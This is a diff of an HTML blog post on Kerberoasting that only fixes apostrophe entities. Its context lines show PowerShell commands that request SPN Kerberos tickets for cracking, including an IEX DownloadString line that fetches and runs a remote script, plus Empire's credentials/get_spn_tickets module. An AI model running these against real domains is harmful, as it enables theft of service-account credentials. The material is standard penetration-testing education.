@@ -119,7 +119,7 @@
 <p>Now that we&rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.</p>
 <h2 id="requesting-spn-kerberos-tickets">Requesting SPN Kerberos Tickets</h2>
 <h3 id="powershell-requesting">PowerShell Requesting</h3>
-<p>These are stolen directly from <a href="https://twitter.com/timmedin">Tim Medin @timmedin</a>&lsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/README.md">Kerberoast repository README.md</a></p>
+<p>These are stolen directly from <a href="https://twitter.com/timmedin">Tim Medin @timmedin</a>&rsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/README.md">Kerberoast repository README.md</a></p>
 <p><strong>One specific ticket:</strong></p>
 <p>This is great if you are targeting one specific user account:</p>
 <pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
@@ -134,7 +134,7 @@ PS C:\&gt; setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 |
 <pre><code>PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
 PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&quot;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
 </code></pre><h3 id="empire">Empire</h3>
-<p>PowerShell Empire received the functionality to get the SPN Tickets via <a href="https://twitter.com/harmj0y">@harmj0y</a>&lsquo;s commit here: <a href="https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639">b977dec</a> which as of the writing of this post was still in the <code>dev</code> branch of Empire (not master yet)</p>
+<p>PowerShell Empire received the functionality to get the SPN Tickets via <a href="https://twitter.com/harmj0y">@harmj0y</a>&rsquo;s commit here: <a href="https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639">b977dec</a> which as of the writing of this post was still in the <code>dev</code> branch of Empire (not master yet)</p>
 <pre><code>(Empire: BDW3E2G2ZRKCUS3B) &gt; usemodule credentials/get_spn_tickets
 (Empire: credentials/get_spn_tickets) &gt; info
 
